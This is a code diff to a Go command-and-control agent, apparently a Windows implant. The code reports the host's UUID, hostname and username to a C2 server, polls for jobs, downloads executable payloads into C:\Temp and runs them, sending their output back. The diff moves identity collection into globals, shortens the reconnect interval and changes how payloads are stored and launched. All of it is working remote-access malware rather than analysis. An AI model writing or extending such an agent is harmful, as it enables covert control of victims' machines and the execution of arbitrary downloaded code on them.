@@ -21,9 +21,13 @@ import (
 	"github.com/google/uuid"
 )
 
+var Uuid string
+var Hostname string
+var Username string
 var AuthorizationToken string
 var AuthorizationTokenExpire string
 var JobsQueue []string
+var TempDir = "C:\\Temp"
 
 var connectionErr = fmt.Errorf("can't connect to a C2")
 var marshalErr = fmt.Errorf("can't marshal a data for json")
@@ -43,14 +47,19 @@ var LogBuffer bytes.Buffer
 var Logger = zerolog.New(&LogBuffer).With().Timestamp().Logger()
 
 func AGENT() {
+	id := uuid.New()
+	Uuid = id.String()
+	Hostname = GETMACHINENAME()
+	Username = GETUSERNAME()
 	JobsQueue = make([]string, 0)
+	_ = os.MkdirAll(TempDir, os.ModePerm)
 	for {
 		for {
 			err := TRYTOCONNECT()
 			if errors.Is(err, nil) {
 				break
 			} else {
-				time.Sleep(time.Second * 5)
+				time.Sleep(time.Second * 3)
 			}
 		}
 		for {
@@ -70,17 +79,7 @@ func AGENT() {
 }
 
 func TRYTOCONNECT() error {
-	id := uuid.New()
-	uuid := id.String()
-	hostname, err := GETMACHINENAME()
-	if err != nil {
-		return err
-	}
-	username, err := GETUSERNAME()
-	if err != nil {
-		return err
-	}
-	connectPostBody := map[string]string{"uuid": uuid, "hostname": hostname, "username": username}
+	connectPostBody := map[string]string{"uuid": Uuid, "hostname": Hostname, "username": Username}
 	connectPostJson, err := json.Marshal(connectPostBody)
 	if err != nil {
 		return marshalErr
@@ -122,24 +121,24 @@ func TRYTOCONNECT() error {
 	}
 }
 
-func GETMACHINENAME() (string, error) {
+func GETMACHINENAME() string {
 	hostname, err := os.Hostname()
 	if err != nil {
 		Logger.Info().Str("status", "error").Str("stage", "getting hostname").Msg(hostnameErr.Error())
-		return "", hostnameErr
+		return ""
 	}
 	Logger.Info().Str("status", "success").Str("stage", "getting hostname").Msg("Successfully got a hostname")
-	return hostname, nil
+	return hostname
 }
 
-func GETUSERNAME() (string, error) {
+func GETUSERNAME() string {
 	user, err := user.Current()
 	if err != nil {
 		Logger.Info().Str("status", "error").Str("stage", "getting username").Msg(usernameErr.Error())
-		return "", usernameErr
+		return ""
 	}
 	Logger.Info().Str("status", "success").Str("stage", "getting username").Msg("Successfully got a username")
-	return user.Username, nil
+	return user.Username
 }
 
 func CHECKJOBS() error {
@@ -209,13 +208,13 @@ func DOJOBS() (map[string]bool, map[string]string) {
 			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(responseReadingErr.Error())
 			jobsStatus[jobUuid] = false
 		}
-		payloadFilename := jobUuid + ".exe"
+		payloadFilename := TempDir + "\\" + jobUuid + ".exe"
 		err = WRITETOFILE(payloadFilename, string(respBody))
 		if err != nil {
 			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(err.Error())
 			jobsStatus[jobUuid] = false
 		}
-		jobOut, err := RUNJOB(payloadFilename)
+		jobOut, err := RUNJOB(payloadFilename, jobUuid)
 		if !errors.Is(err, payloadExecutionErr) {
 			if len(jobOut) == 0 {
 				jobsOut[jobUuid] = "Job hasn't returned some output. But it seems ok."
@@ -247,8 +246,8 @@ func WRITETOFILE(filename string, data string) error {
 	return file.Sync()
 }
 
-func RUNJOB(payloadFilename string) ([]byte, error) {
-	payloadResults, err := exec.Command(".\\"+payloadFilename, "").Output()
+func RUNJOB(payloadFilename string, jobUuid string) ([]byte, error) {
+	payloadResults, err := exec.Command(payloadFilename, jobUuid).Output()
 	if err != nil {
 		return nil, payloadExecutionErr
 	}
